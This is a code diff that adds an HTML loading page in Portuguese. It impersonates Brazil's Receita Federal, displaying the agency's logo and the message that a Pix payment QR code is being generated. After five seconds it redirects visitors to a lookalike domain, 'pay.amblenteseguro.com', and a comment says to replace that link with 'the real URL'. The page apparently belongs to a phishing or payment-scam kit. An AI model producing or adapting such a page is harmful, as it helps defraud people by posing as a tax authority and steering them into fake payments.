@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Preparando Pagamento</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      background-color: #3498db;
+    }
+    .animate-pulse {
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    .fade-in {
+      animation: fadeIn 0.5s ease-in;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .animate-bounce {
+      animation: bounce 1.4s infinite;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-5px); }
+    }
+  </style>
+</head>
+<body>
+  <div id="loadingPage" class="fixed inset-0 w-full h-full bg-[#005CA9]/95 z-50 flex items-center justify-center fade-in">
+    <div class="flex flex-col items-center justify-center">
+      <div class="relative w-40 h-40 mb-8">
+        <!-- Logo -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Receita_Federal_do_Brasil_%28logo%29.svg" alt="Logo Receita" class="w-32 absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 z-10 animate-pulse">
+
+        <!-- Anel de carregamento -->
+        <svg class="w-40 h-40 absolute top-0 left-0" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="50" cy="50" r="45" fill="none" stroke="rgba(255, 255, 255, 0.2)" stroke-width="6"/>
+          <circle cx="50" cy="50" r="45" fill="none" stroke="white" stroke-width="6" stroke-linecap="round" stroke-dasharray="283" stroke-dashoffset="100">
+            <animateTransform attributeName="transform" type="rotate" from="0 50 50" to="360 50 50" dur="2s" repeatCount="indefinite"/>
+          </circle>
+        </svg>
+      </div>
+
+      <div class="text-center text-white">
+        <h1 class="text-2xl font-bold mb-3">Preparando seu pagamento</h1>
+        <p class="text-base opacity-90">Estamos gerando seu QR Code Pix...</p>
+
+        <div class="flex justify-center mt-4 space-x-1">
+          <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0s"></div>
+          <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0.2s"></div>
+          <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0.4s"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Tempo de carregamento em milissegundos (ex: 5000 = 5 segundos)
+    setTimeout(() => {
+      window.location.href = "https://pay.amblenteseguro.com/CuCTBVqT"; // <- troca aqui pela URL real
+    }, 5000);
+  </script>
+</body>
+</html>
